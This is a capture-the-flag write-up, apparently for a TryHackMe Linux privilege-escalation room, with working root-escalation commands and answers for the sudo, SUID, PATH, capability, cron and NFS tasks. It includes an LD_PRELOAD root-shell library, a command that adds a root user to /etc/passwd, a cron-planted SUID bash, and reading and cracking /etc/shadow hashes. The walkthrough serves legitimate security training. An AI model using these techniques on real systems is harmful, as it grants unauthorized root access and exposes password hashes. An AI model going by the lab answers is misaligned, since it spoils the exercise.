## 🛠️ Task 2: Sudo Abuse

### Enumeration
- `sudo -l` – lists commands the user can run with sudo.
- Check GTFOBins (https://gtfobins.github.io) for exploitation methods.

### Key Techniques

#### 1. Basic Sudo Escalation
- If you can run a binary like `cat` as root, read `/etc/shadow`:
  ```bash
  sudo cat /etc/shadow
  ```
- Crack hashes offline with John the Ripper.

#### 2. Leverage Application Functions
- Some apps have options that leak info (e.g., `apache2 -f /etc/shadow`).
- Error messages may expose root hashes.

#### 3. LD_PRELOAD Exploitation
- If `sudo -l` shows `env_keep+=LD_PRELOAD`, create a shared library.
- **C code (`shell.c`):**
  ```c
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  void _init() {
      unsetenv("LD_PRELOAD");
      setgid(0);
      setuid(0);
      system("/bin/bash");
  }
  ```
- Compile:
  ```bash
  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
  ```
- Run with sudo:
  ```bash
  sudo LD_PRELOAD=/home/user/shell.so find
  ```

**Task 2 Answers:**
- Full path of program john can run with sudo → `/usr/bin/nano` (and `/usr/sbin/apache2`)
- Contents of `/root/flag.txt` → (read with `sudo /usr/bin/nano /root/flag.txt`)

## 🔧 Task 3: SUID Binaries

### Enumeration
- Find SUID binaries:
  ```bash
  find / -type f -perm -04000 -ls 2>/dev/null
  ```
- Check GTFOBins for SUID exploitation: https://gtfobins.github.io/#//^suid$

### Exploitation Methods

#### Option 1: Read `/etc/shadow`
- If `nano` (or similar) has SUID set:
  ```bash
  nano /etc/shadow
  ```
- Use `unshadow` and John to crack hashes.

#### Option 2: Add Root User to `/etc/passwd`
- Generate password hash:
  ```bash
  openssl passwd -1 -salt THM password1
  ```
- Add to `/etc/passwd`:
  ```
  hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
  ```
- Switch user:
  ```bash
  su hacker
  ```

**Task 3 Answers:**
- Full path of SUID binary in `/usr/bin/` → `/usr/bin/vim.basic`
- Contents of `/root/root_priv_esc_flag.txt` → `THM{root-by-SUID-REDACTED}`

## 🔗 Task 4: PATH Hijacking

### Concept
- If a writable directory is in `PATH`, you can create a malicious binary that gets executed by a SUID program.

### Steps
1. Find writable directories:
   ```bash
   find / -type d -writable 2>/dev/null | sort -u
   ```
2. Add a writable directory to PATH:
   ```bash
   export PATH=/tmp:$PATH
   ```
3. Create a malicious script:
   ```bash
   echo "/bin/bash" > /tmp/whoami
   chmod 777 /tmp/whoami
   ```
4. Run the SUID binary that calls the hijacked command:
   ```bash
   /opt/path/mywhoami
   ```

**Task 4 Answers:**
- Full path of custom SUID binary → `/opt/path/mywhoami`
- Binary called from path (via `strings`) → `whoami`
- Contents of `/root/flag.txt` → `THM{PATH-and-SUID-REDACTED}`

## 🧩 Task 5: Linux Capabilities

### Enumeration
- List binaries with set capabilities:
  ```bash
  getcap -r / 2>/dev/null
  ```

### Exploitation
- If a binary has `cap_setuid+ep` (e.g., Python), use it to spawn a root shell:
  ```bash
  /usr/bin/python3.12 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'
  ```

**Task 5 Answers:**
- Number of binaries with set capabilities → `6` (from `getcap -r / 2>/dev/null`)
- Full path of exploitable binary → `/usr/bin/python3.12`
- Contents of `/root/flag.txt` → `THM{caps_getting_REDACTED}`

## ⏰ Task 6: Cron Jobs

### Enumeration
- Check system-wide crontab:
  ```bash
  cat /etc/crontab
  ```
- Check other cron locations: `/etc/cron.d/`, `/var/spool/cron/`, `/etc/cron.hourly/`, etc.

### Exploitation

#### Scenario: Writable Script + Missing Script
- Found cron job in `/etc/cron.d/cleanup`:
  ```
  * * * * * root /usr/local/bin/cleanup.sh
  ```
- Script `/usr/local/bin/cleanup.sh` is writable (`-rwxrwxrwx`):
  ```bash
  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/cleanup.sh
  ```
- Wait for cron to run (up to 60 seconds), then:
  ```bash
  /tmp/rootbash -p
  ```

**Task 6 Answers:**
- Full path of exploitable cron job → `/etc/cron.d/cleanup`
- Contents of `/root/flag.txt` → `THM{g0t-r00t-from-REDACTED}`

## 📂 Task 7: NFS (Network File System)

### Enumeration
- Check NFS exports on target:
  ```bash
  showmount -e TARGET_IP
  ```
- Check `/etc/exports` for `no_root_squash` option.

### Exploitation
1. Mount the share locally:
   ```bash
   mkdir /tmp/nfsmount
   mount -o rw TARGET_IP:/opt/nfs /tmp/nfsmount
   ```
2. Copy a bash binary and set SUID:
   ```bash
   cd /tmp/nfsmount
   cp /bin/bash rootbash
   chmod +s rootbash
   ```
3. Run on target:
   ```bash
   /opt/nfs/rootbash -p
   ```

**Task 7 Answers:**
- Full path of mountable share → `/opt/nfs`
- Contents of `/root/flag.txt` → `THM{exports-r00T-REDACTED}`

## 🔑 Key Takeaways
- **Sudo abuse** – check `sudo -l` and GTFOBins for exploitation methods.
- **SUID binaries** – look for unusual SUID files; use them to read shadow or add root users.
- **PATH hijacking** – if you can write to a directory in PATH, you can hijack SUID binaries.
- **Capabilities** – `cap_setuid+ep` allows binaries to change UID; use GTFOBins to exploit.
- **Cron jobs** – check for writable scripts or missing scripts with no full path.
- **NFS** – `no_root_squash` allows creating root-owned SUID binaries from an attacker machine.
- **GTFOBins** is your best friend for exploitation techniques.
